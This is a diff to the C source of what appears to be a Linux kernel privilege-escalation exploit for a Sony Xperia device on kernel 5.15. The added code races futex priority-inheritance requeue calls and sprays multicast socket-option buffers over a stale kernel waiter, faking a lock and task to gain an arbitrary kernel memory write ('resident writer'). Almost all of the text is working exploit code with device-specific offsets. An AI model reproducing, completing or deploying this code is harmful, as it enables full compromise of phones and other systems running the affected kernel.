@@ -12,6 +12,130 @@ extern int pselect_custom_write;
 int route_last_step;
 int route_last_errno;
 
+/* Xperia 5.15 route. The multicast option buffer overlaps the stale compact
+ * waiter. These helpers are selected only for profiles with mcast_waiter_off. */
+static uint32_t mr_l1, mr_l2, mr_cond;
+static pthread_t mr_tx, mr_ty;
+static atomic_int mr_y_l2, mr_x_l1, mr_y_wait, mr_x_wait, mr_y_done;
+static atomic_int mr_respray, mr_sprayed, mr_stop, mr_x_done, mr_y_tid;
+static uintptr_t mr_target, mr_value, mr_lock, mr_task;
+static int mr_fd = -1, mr_ready, mr_policy, mr_lock_slot;
+
+static void mr_intr(int sig) { (void)sig; }
+static long mr_adjust(void) {
+  struct sched_param sp = {.sched_priority = 0};
+  int next = mr_policy == SCHED_NORMAL ? SCHED_BATCH : SCHED_NORMAL;
+  long r = syscall(SYS_sched_setscheduler, atomic_load(&mr_y_tid), next, &sp);
+  mr_policy = next;
+  return r;
+}
+static void mr_stamp(uintptr_t target, uintptr_t value, uintptr_t lock) {
+  unsigned char b[0x108]; size_t o = active_offsets->mcast_waiter_off;
+  memset(b, 0, sizeof(b));
+  if (target) { put64(b, o, (target - 8) & ~(uintptr_t)3); put64(b, o + 8, value); }
+  put64(b, o + 0x30, mr_task); put64(b, o + 0x38, lock);
+  uint16_t family = AF_UNSPEC; memcpy(b + 8, &family, sizeof(family));
+  setsockopt(mr_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, b, sizeof(b));
+}
+static void *mr_y(void *arg) {
+  (void)arg; pin_to_core(CONSUMER_CORE);
+  sigset_t set; sigemptyset(&set); sigaddset(&set, SIGUSR1);
+  pthread_sigmask(SIG_UNBLOCK, &set, NULL);
+  atomic_store(&mr_y_tid, syscall(SYS_gettid));
+  futex_op(&mr_l2, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+  atomic_store(&mr_y_l2, 1); while (!atomic_load(&mr_x_l1)) sched_yield();
+  atomic_store(&mr_y_wait, 1);
+  futex_op(&mr_cond, FUTEX_WAIT_REQUEUE_PI_PRIVATE, 0, NULL, &mr_l1, 0);
+  mr_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+  if (mr_fd < 0) return NULL;
+  mr_stamp(0, 0, mr_lock); atomic_store(&mr_y_done, 1);
+  while (!atomic_load(&mr_stop)) {
+    if (atomic_exchange(&mr_respray, 0)) {
+      uintptr_t lock = mr_lock + 0x80 + (mr_lock_slot++ % 12) * 8;
+      mr_stamp(mr_target, mr_value, lock); atomic_store(&mr_sprayed, 1);
+    }
+    sched_yield();
+  }
+  uint32_t dummy = 0x80000000U | (uint32_t)getpid(); struct timespec z = {0,0};
+  futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, NULL, 0);
+  futex_op(&mr_l2, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+  while (!atomic_load(&mr_x_done)) sched_yield();
+  close(mr_fd); mr_fd = -1; return NULL;
+}
+static void *mr_x(void *arg) {
+  (void)arg; pin_to_core(CORE);
+  while (!atomic_load(&mr_y_l2)) sched_yield();
+  futex_op(&mr_l1, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+  atomic_store(&mr_x_l1, 1); atomic_store(&mr_x_wait, 1);
+  futex_op(&mr_l2, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+  futex_op(&mr_l1, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+  futex_op(&mr_l2, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+  atomic_store(&mr_x_done, 1); return NULL;
+}
+int mcast_resident_start(void) {
+  if (mr_ready) return 1;
+  uintptr_t bss = data_addr(KIMAGE_TEXT_BASE + active_offsets->off_mcast_fake_bss);
+  mr_lock = bss + 0x1200; mr_task = mr_lock + 0x2000;
+  mr_l1=mr_l2=mr_cond=0; mr_policy=SCHED_NORMAL; mr_lock_slot=0;
+  atomic_store(&mr_y_l2,0); atomic_store(&mr_x_l1,0); atomic_store(&mr_y_wait,0);
+  atomic_store(&mr_x_wait,0); atomic_store(&mr_y_done,0); atomic_store(&mr_stop,0);
+  atomic_store(&mr_x_done,0); atomic_store(&mr_respray,0);
+  struct sigaction sa={0}; sa.sa_handler=mr_intr; sigemptyset(&sa.sa_mask);
+  if (sigaction(SIGUSR1,&sa,NULL) || pthread_create(&mr_ty,NULL,mr_y,NULL) ||
+      pthread_create(&mr_tx,NULL,mr_x,NULL)) return 0;
+  while (!(atomic_load(&mr_y_l2)&&atomic_load(&mr_x_l1)&&atomic_load(&mr_y_wait)&&atomic_load(&mr_x_wait))) sched_yield();
+  usleep(200000); errno=0;
+  long r=futex_op(&mr_cond,FUTEX_CMP_REQUEUE_PI_PRIVATE,1,(void*)0,&mr_l1,0);
+  mr_cond=1; syscall(SYS_tgkill,getpid(),atomic_load(&mr_y_tid),SIGUSR1);
+  if (r>=0 || (errno!=EDEADLK && errno!=EDEADLOCK)) return 0;
+  for(int i=0;i<10000000&&!atomic_load(&mr_y_done);i++) sched_yield();
+  if(!atomic_load(&mr_y_done) || mr_adjust()<0) return 0;
+  usleep(100000); mr_ready=1;
+  pr_success("5.15 resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",bss,mr_lock,mr_task);
+  return 1;
+}
+int mcast_resident_write(uintptr_t target, uintptr_t value) {
+  if(!mr_ready) return 0; mr_target=target; mr_value=value;
+  atomic_store(&mr_sprayed,0); atomic_store(&mr_respray,1);
+  while(!atomic_load(&mr_sprayed)) sched_yield();
+  long r=mr_adjust(); pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n",value,target,r);
+  return r==0;
+}
+void mcast_resident_stop(void) {
+  if(!mr_ready) return; atomic_store(&mr_stop,1);
+  pthread_join(mr_ty,NULL); pthread_join(mr_tx,NULL); mr_ready=0;
+  close_reclaim_sockets(); cleanup_page_prepare_state();
+  pr_success("5.15 resident writer disarmed\n");
+}
+
+void do_mcast_fake_lock_route(void) {
+  enum { STAMP_SIZE = 0x108 };
+  size_t waiter_off = (size_t)active_offsets->mcast_waiter_off;
+  unsigned char stamp[STAMP_SIZE];
+  memset(stamp, 0, sizeof(stamp));
+  put64(stamp, waiter_off + 0x30, fake_task);
+  put64(stamp, waiter_off + 0x38, fake_lock);
+  uint16_t family = AF_UNSPEC;
+  memcpy(stamp + 8, &family, sizeof(family));
+
+  int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+  if (fd < 0) { route_last_step = 60; route_last_errno = errno; return; }
+  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
+  atomic_store(&punch_consume_stop, 0); atomic_store(&main_route_delay_usec, 0);
+  errno = 0;
+  int ret = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, sizeof(stamp));
+  route_last_step = 61; route_last_errno = errno;
+  atomic_store(&punch_consume_go, 1);
+  for (int spin = 0; spin < 100000000 && atomic_load(&consumer_calls) == 0; spin++)
+    __asm__ volatile("yield" ::: "memory");
+  atomic_store(&punch_consume_go, 0);
+  while (atomic_load(&consumer_inflight)) __asm__ volatile("yield" ::: "memory");
+  close(fd);
+  if (ret == 0 || atomic_load(&consumer_success) > 0) {
+    route_last_step = 0; route_last_errno = 0;
+  }
+}
+
 /* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
  * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
  * waiter->lock. */
@@ -596,4 +720,3 @@ void do_pselect_fake_lock_route(void) {
   pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
           calls, success, route_last_step, route_last_errno);
 }
-
